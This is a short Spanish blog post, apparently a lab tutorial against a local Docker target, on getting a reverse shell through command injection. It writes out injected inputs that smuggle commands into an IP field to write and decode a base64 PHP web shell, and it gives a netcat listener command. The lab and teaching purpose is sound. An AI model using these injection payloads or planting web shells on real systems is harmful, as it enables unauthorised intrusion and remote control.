---

typora-copy-images-to: ../assets/img/
typora-root-url: ../
layout: post
categories: 
conToc: true
title: Reverse shell con Command injection
---





## Reverse shell con Command injection

Esta practica, necesitaremos el mismo docker y el mismo fichero php que hemos usado en la [practica anterior](https://yosoymark0911.github.io/2022/03/21/File-Upload.html)

Lo siguiente que haremo será codificar nuestro código php por un [codificador de base64](https://www.base64encode.org/).

A continuación iremos a Command Injection y ejecutaremos lo siguiente:



```bash
   127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt
```

![image-20220505171824348](/assets/img/image-20220505171824348.png)



Ahora le pasaremos el siguiente comando:

```bash
127.0.0.1 ; cat shell.txt | base64 -d > shell.php
```

Y antes de nada, en una termial, ejecutaremos el siguiente comando: 

```bash
nc -v -n -l -p 1234
```

Ahora iremos a la URL localhost:8080/vulnerabilities/exec/shell.php y podremos ver como se ejecuta nuestro shell:



![image-20220505172241762](/assets/img/image-20220505172241762.png)
